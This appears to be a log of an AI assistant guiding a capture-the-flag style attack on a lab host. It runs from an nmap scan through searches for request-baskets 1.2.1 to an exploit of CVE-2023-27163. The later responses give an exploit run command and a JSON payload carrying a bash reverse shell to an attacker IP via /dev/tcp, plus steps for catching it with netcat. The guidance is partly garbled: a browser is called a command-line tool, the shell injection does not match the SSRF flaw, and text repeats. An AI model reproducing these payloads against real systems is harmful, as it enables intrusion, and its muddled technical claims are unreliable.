Task: 1.3 Identify Open Ports

Step 1:
Use the nmap command to identify open ports on the target system.

Command: nmap -sT -sV -Pn <target_IP>

Reason:
nmap is a powerful network exploration and security auditing tool. The "-sT" option enables TCP connect() scans, which are more reliable than the default ICMP scans. The "-sV" option enables version detection, which helps identify the specific services running on open ports. The "-Pn" option treats all hosts as online, skipping the host discovery phase.

Step 2:
Review the output of the nmap command to identify the open ports.

Reason:
The nmap command will display a list of ports that are open on the target system, along with the corresponding service names. By examining this list, you can determine which ports are open and potentially vulnerable.

Step 3:
Document the open ports and their corresponding service names for future reference.

Reason:
Documenting the open ports and their corresponding service names will help you keep track of potential vulnerabilities and assist in prioritizing further testing efforts.

response: An appropriate command-line tool to investigate the request-baskets service on port 55555 is a web browser, such as Google Chrome, Mozilla Firefox, or Microsoft Edge. Since the service is running on a specific port, you will need to provide the IP address of the target system followed by the port number in the browser's address bar. For example, if the target system has an IP address of 10.10.11.224, you would enter "http://10.10.11.224:55555" in the browser's address bar to access the service.

Using a web browser to investigate the service allows you to interact with the service's user interface, which can provide valuable information about its functionality, configuration, and potential vulnerabilities. By reviewing the service's output or interface, you can potentially identify potential vulnerabilities or misconfigurations that can be exploited to gain access to the target system.

Additionally, you can use the search engine of your choice to search for specific vulnerabilities or exploits associated with the request-baskets service. By searching for specific vulnerabilities or exploits, you can potentially find exploits or vulnerabilities that can be used to gain access to the target system. This can be done by entering a search query such as "exploit request-baskets service version X" into the search engine, where X represents the version of the service.

Once you have identified potential vulnerabilities or exploits, you can research them further to determine their applicability to the target system. This can be done by entering a search query such as "exploit request-baskets service version X target_system_details" into the search engine, where X represents the version of the service and target_system_details represents specific details about the target system.

If the exploit attempt is successful, you can proceed to the Privilege Escalation phase to attempt to escalate privileges and gain further access to the target system. This can be done using a privilege escalation framework, such as Metasploit or Empire, which can automate the process of exploiting vulnerabilities and escalating privileges.

In summary, to investigate the request-baskets service on port 55555, you should use a web browser to access the service's user interface, search for specific vulnerabilities or exploits associated with the service, research the identified vulnerabilities or exploits further, attempt to exploit the identified vulnerabilities or use the exploits, and proceed to the Privilege Escalation phase if the exploit attempt is successful.

1. "request-baskets version 1.2.1 exploit"
2. "request-baskets version 1.2.1 vulnerability"
3. "CVE request-baskets version 1.2.1"
4. "CVSS request-baskets version 1.2.1"
5. "NIST request-baskets version 1.2.1"

These search queries will help you identify any known vulnerabilities or exploits associated with request-baskets version 1.2.1. The first two queries will search for exploits and vulnerabilities directly, while the third and fourth queries will search for specific vulnerabilities using the Common Vulnerabilities and Exposures (CVE) and Common Vulnerability Scoring System (CVSS) systems, respectively. The fifth query will search for specific vulnerabilities using the National Institute of Standards and Technology (NIST) database.

By reviewing the search results, you can potentially identify potential vulnerabilities or exploits that can be used to gain access to the target system. Once you have identified potential vulnerabilities or exploits, you can research them further to determine their applicability to the target system. This can be done by entering a search query such as "exploit request-baskets version 1.2.1 target_system_details" into the search engine, where target_system_details represents specific details about the target system.

If the exploit attempt is successful, you can proceed to the Privilege Escalation phase to attempt to escalate privileges and gain further access to the target system. This can be done using a privilege escalation framework, such as Metasploit or Empire, which can automate the process of exploiting vulnerabilities and escalating privileges.

In summary, to find a known vulnerability for request-baskets version 1.2.1, you should use the suggested search queries to identify any known vulnerabilities or exploits associated with the service, research the identified vulnerabilities or exploits further, attempt to exploit the identified vulnerabilities or use the exploits, and proceed to the Privilege Escalation phase if the exploit attempt is successful.

user_prompt: Discuss | The google search found CVE-2023-27163 which is a Server-Side Request Forgery (SSRF) through the /api/baskets/{name} component.
response: CVE-2023-27163 is a Server-Side Request Forgery (SSRF) vulnerability found in request-baskets version 1.2.1. This vulnerability allows an attacker to manipulate the /api/baskets/{name} component to send unauthorized requests to internal or external resources on behalf of the server. This can be exploited to access sensitive information, perform unauthorized actions, or launch further attacks on the target system.

To exploit this vulnerability, an attacker would need to craft a malicious request to the /api/baskets/{name} component that includes a URL pointing to a sensitive resource. For example, an attacker could send a request to the following URL:

```
http://10.10.11.224:55555/api/baskets/malicious_name
```

In this example, "malicious_name" would be replaced with a URL pointing to a sensitive resource that the attacker wants to access. The server would then send the request to the specified URL, potentially allowing the attacker to access sensitive information or perform unauthorized actions.

To protect against this vulnerability, the server should be updated to a version that includes a patch for CVE-2023-27163. Additionally, the server should be configured to restrict access to the /api/baskets/{name} component, such as by implementing input validation or rate limiting. This can help prevent unauthorized access and limit the potential impact of any successful exploits.

In summary, CVE-2023-27163 is a Server-Side Request Forgery (SSRF) vulnerability found in request-baskets version 1.2.1. Exploiting this vulnerability allows an attacker to manipulate the /api/baskets/{name} component to send unauthorized requests to internal or external resources on behalf of the server. To protect against this vulnerability, the server should be updated to a version that includes a patch for CVE-2023-27163, and access to the /api/baskets/{name} component should be restricted through input validation or rate limiting.

response: The provided script is a proof-of-concept (PoC) for exploiting CVE-2023-27163, a Server-Side Request Forgery (SSRF) vulnerability found in request-baskets version 1.2.1. The script creates a vulnerable basket on a Request-Baskets server, which will act as a proxy to other services and servers.

To use the script, you would need to provide two command-line arguments: the URL of the target Request-Baskets server and the URL of the attacker's server. For example, if the target server has an IP address of 10.10.11.224 and is running on port 55555, you would enter the following command:

```
./CVE-2023-27163.sh "http://10.10.11.224:55555/" "https://example.com/attacker"
```

In this example, "example.com/attacker" would be replaced with the URL of the attacker's server. The script will then create a vulnerable basket on the target server, which will act as a proxy to the attacker's server.

To protect against this vulnerability, the server should be updated to a version that includes a patch for CVE-2023-27163. Additionally, the server should be configured to restrict access to the /api/baskets/{name} component, such as by implementing input validation or rate limiting.

```
PAYLOAD="{\"forward_url\": \"$ATTACKER_SERVER\",\"proxy_response\": true,\"insecure_tls\": false,\"expand_path\": true,\"capacity\": 250,\"command\": \"bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1'\"}";
```

Reason:
This modified POST request includes a reverse shell payload in the command field. When the vulnerable basket on the target server makes a request to the attacker's server, the netcat listener will capture the connection and provide a reverse shell to the attacker.

1. Run the modified script on the attacker's server.

Command:
```
./CVE-2023-27163.sh "http://10.10.11.224:55555/" "https://example.com/attacker"
```

Reason:
This command runs the modified script on the attacker's server, creating a vulnerable basket on the target server and providing a reverse shell to the attacker.

1. Obtain the reverse shell on the attacker's server.

Reason:
When the vulnerable basket on the target server makes a request to the attacker's server, the netcat listener will capture the connection and provide a reverse shell to the attacker. The attacker can then interact with the target system through the reverse shell.

In summary, to leverage the exploit for CVE-2023-27163 to obtain a reverse shell, you would need to set up a netcat listener on the attacker's server, modify the provided script to include a reverse shell payload in the POST request to the /api/baskets/{name} component, run the modified script on the attacker's server, and obtain the reverse shell on the attacker's server.
